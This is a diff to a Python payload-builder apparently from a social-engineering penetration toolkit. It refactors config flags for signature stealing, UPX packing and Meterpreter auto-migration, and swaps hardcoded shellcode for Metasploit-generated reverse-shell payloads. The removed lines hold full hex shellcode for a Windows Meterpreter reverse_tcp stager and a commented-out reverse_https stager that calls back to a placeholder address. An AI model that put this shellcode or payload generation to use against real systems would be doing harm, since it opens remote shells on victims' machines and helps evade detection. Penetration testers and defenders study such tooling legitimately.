@@ -24,63 +24,26 @@ encount="4"
 
 configfile=file("%s/config/set_config" % (definepath),"r").readlines()
 
-auto_migrate="OFF"
-
+# check the metasploit path
 msf_path = meta_path()
 
-for line in configfile:
-    line=line.rstrip()
-    match1=re.search("ENCOUNT=", line)
-    if match1:
-        line=line.replace("ENCOUNT=", "")
-        encount=line
-
-    match2=re.search("AUTO_MIGRATE=", line)
-    if match2:
-        line=line.replace("AUTO_MIGRATE=", "")
-        auto_migrate=line
-
-    match3=re.search("DIGITAL_SIGNATURE_STEAL=", line)
-    if match3:
-        digital_steal=line.replace("DIGITAL_SIGNATURE_STEAL=", "")
-
-    match4=re.search("METERPRETER_MULTI_SCRIPT=", line)
-    if match4:
-        meterpreter_multi=line.replace("METERPRETER_MULTI_SCRIPT=", "")
-
-    match5=re.search("LINUX_METERPRETER_MULTI_SCRIPT=", line)
-    if match5:
-        linux_meterpreter_multi=line.replace("LINUX_METERPRETER_MULTI_SCRIPT=", "")
-
-    match6=re.search("METERPRETER_MULTI_COMMANDS=", line)
-    if match6:
-        meterpreter_multi_command=line.replace("METERPRETER_MULTI_COMMANDS=", "")
-        meterpreter_multi_command=meterpreter_multi_command.replace(";", "\n")
-
-    match7=re.search("LINUX_METERPRETER_MULTI_COMMANDS=", line)
-    if match7:
-        linux_meterpreter_multi_command=line.replace("LINUX_METERPRETER_MULTI_COMMANDS=", "")
-        linux_meterpreter_multi_command=linux_meterpreter_multi_command.replace(";", "\n")
-
-    # define if we use upx encoding or not
-    match8=re.search("UPX_ENCODE=", line)
-    if match8:
-        upx_encode=line.replace("UPX_ENCODE=", "")
-
-    # set the upx flag
-    match9=re.search("UPX_PATH=", line)
-    if match9:
-        upx_path=line.replace("UPX_PATH=", "")
-        if upx_encode == "ON":
-            if not os.path.isfile(upx_path):
-                if operating_system != "windows":
-                    print_error("ERROR:UPX packer not found in the pathname specified in config. Disabling UPX packing for executable!")
-                upx_encode == "OFF"
-
-    # set the unc embed flag
-    match10=re.search("UNC_EMBED=", line)
-    if match10:
-        unc_embed=line.replace("UNC_EMBED=", "")
+# check the config files for all of the flags needed for the file
+encount=check_config("ENCOUNT=")
+auto_migrate=check_config("AUTO_MIGRATE=")
+digital_steal=check_config("DIGITAL_SIGNATURE_STEAL=")
+meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT=")
+linux_meterpreter_multi=check_config("LINUX_METERPRETER_MULTI_SCRIPT=")
+meterpreter_multi_command=check_config("METERPRETER_MULTI_COMMANDS=")
+meterpreter_multi_command = meterpreter_multi_command.replace(";", "\n")
+linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS=")
+linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(";", "\n")
+upx_encode = check_config("UPX_ENCODE=")
+upx_path = check_config("UPX_PATH=")
+if operating_system != "windows":
+	if not os.path.isfile(upx_path):
+			print_error("ERROR: UPX packer was not found. Disabling UPX packing.")
+			upx_encode = "OFF"
+unc_embed = check_config("UNC_EMBED=")
 
 # add the digital signature stealing
 if digital_steal == "ON":
@@ -468,22 +431,16 @@ try:
 
 				if choice9 == "windows/meterpreter/reverse_tcp_allports": portnum = "LPORT=1"
 
-				if choice9 == "windows/meterpreter/reverse_tcp":
-					# shellcode for meterpreter reverse_tcp
-					shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
-				if choice9 == "windows/meterpreter/reverse_https":
-					# cant do shellcode injection here yet #shellcode = r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x63\x79\x30\x50\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
-					print_status("Reverse_HTTPS takes a few seconds to calculate..One moment..")
-					shellcode = generate_shellcode(choice9, choice2,portnum)
-				if choice9 == "windows/meterpreter/reverse_http":
-					print_status("Reverse_HTTP takes a few seconds to calculate..One moment..")
-					shellcode = generate_shellcode(choice9, choice2,portnum)
-				if choice9 == "windows/meterpreter/reverse_tcp_allports":
-					print_status("Reverse TCP Allports takes a few seconds to calculate..One moment..")
-					shellcode = generate_shellcode(choice9, choice2,portnum)
-				if choice9 == "windows/shell/reverse_tcp":
-					print_status("Reverse Shell takes a few seconds to calculate..One moment..")
-					shellcode = generate_shellcode(choice9, choice2, portnum)
+				# meterpreter reverse_tcp
+				if choice9 == "windows/meterpreter/reverse_tcp": shellcode = metasploit_shellcode(choice9, choice2, portnum)
+				# meterpreter reverse_https
+				if choice9 == "windows/meterpreter/reverse_https": shellcode = metasploit_shellcode(choice9, choice2,portnum)
+				# meterpreter reverse_http
+				if choice9 == "windows/meterpreter/reverse_http": shellcode = metasploit_shellcode(choice9, choice2,portnum)
+				# meterpreter tcp allports
+				if choice9 == "windows/meterpreter/reverse_tcp_allports": shellcode = metasploit_shellcode(choice9, choice2,portnum)
+				# windows shell reverse_tcp
+				if choice9 == "windows/shell/reverse_tcp": shellcode = metasploit_shellcode(choice9, choice2, portnum)
 
 				if choice1 == "shellcode/pyinject":
 					shellcode_port = portnum.replace("LPORT=", "")
@@ -494,6 +451,7 @@ try:
 				# break out of the loop if we are only using one payload else keep on
 				if choice1 == "shellcode/pyinject": break
 				multipyinject_payload += shellcode + ","
+
 			# get rid of tail comma
 			if multipyinject_payload.endswith(","):
 				multipyinject_payload = multipyinject_payload[:-1]
